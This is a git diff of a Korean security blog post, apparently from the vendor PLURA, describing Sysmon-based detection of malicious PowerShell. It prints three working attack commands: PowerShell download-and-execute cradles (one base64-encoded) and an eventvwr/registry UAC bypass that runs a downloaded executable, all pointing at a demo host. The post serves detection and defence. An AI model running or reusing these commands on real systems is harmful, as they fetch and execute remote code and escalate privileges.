@@ -58,11 +58,12 @@ PowerShell 우회 및 공격자 서버로부터 파일 다운로드 행위 발�
 PLURA에서는 이런 악의적인 공격을 Sysmon을 활용하여 필터 탐지하고 있습니다.
 
 > **공격 명령어**<br>
-> #powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://blog.plura.io/demo/testfile.exe')<br>
+> ```bash
+> powershell.exe -nop -NoProfile -WindowStyle 1 -c IEX (New-Object Net.WebClient).DownloadString('https://blog.plura.io/demo/testfile.exe')<br>
 >
-> #cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShHV21pIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbjskV0M9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRXQy5IZWFkZXJzWydVc2VyLUFnZW50J109IlBvd2VyU2hlbGwvV0wgJE9TIjtJRVggJFdDLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmxvZy5wbHVyYS5pby9kZW1vL3Rlc3RmaWxlLnBocCcpOw==<br>
+> cmd.exe /c Start /Min PowerShell.exe -NoP -NonI -EP ByPass -W Hidden -E JE9TPShHV21pIFdpbjMyX09wZXJhdGluZ1N5c3RlbSkuQ2FwdGlvbjskV0M9TmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50OyRXQy5IZWFkZXJzWydVc2VyLUFnZW50J109IlBvd2VyU2hlbGwvV0wgJE9TIjtJRVggJFdDLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vYmxvZy5wbHVyYS5pby9kZW1vL3Rlc3RmaWxlLnBocCcpOw==<br>
 >
-> #cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
+> cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebClient).DownloadFile('http://blog.plura.io/demo/sick.exe','%TEMP%\sick.exe') & reg add HKCU\SOFTWARE\Classes\mscfile\shell\open\command /d %tmp%\sick.exe /f & C:\Windows\system32\eventvwr.exe & PING -n 15 127.0.0.1>nul & %tmp%\sick.exe
 
 악성 PowerShell 스크립트는 주로 email 첨부 파일의 다운로더로 사용되거나 침입 후 원격 컴퓨터에서 코드를 실행할 수 있습니다.<br>
 PowerShell 위협에 대처하려면 보다 정교한 탐지 방법과 지속적인 모니터링 등의 노력이 필요합니다.
